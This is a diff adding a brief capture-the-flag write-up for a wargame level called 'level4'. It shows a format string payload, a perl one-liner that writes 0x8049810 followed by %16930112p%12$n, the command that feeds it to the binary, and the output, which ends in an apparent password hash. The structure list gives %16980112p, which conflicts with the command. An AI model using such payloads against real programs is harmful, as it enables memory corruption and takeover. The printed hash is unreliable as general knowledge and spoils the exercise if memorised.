@@ -1,0 +1,15 @@
+After reversing the program, we can see there is again a format string exploit
+We need to overwrite m
+
+with offset for first arg is 12 (AAAA%12$x prints AAAA41414141)
+but this time we will need to set m to 16930116. We need to print a lot of char
+We can use printf precision flag to do that
+	Structure of our strig :
+	- 0x8049810 in little endian escaped
+	- %16980112p to print enough spaces
+	- %12$n to set printed length to the 12th arg
+
+	perl -e 'print "\x10\x98\x04\x08%16930112p%12\$n" . "\n"' > /tmp/str
+	cat /tmp/str - | ./level4
+	[lot of spaces]           0xb7ff26b0
+	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
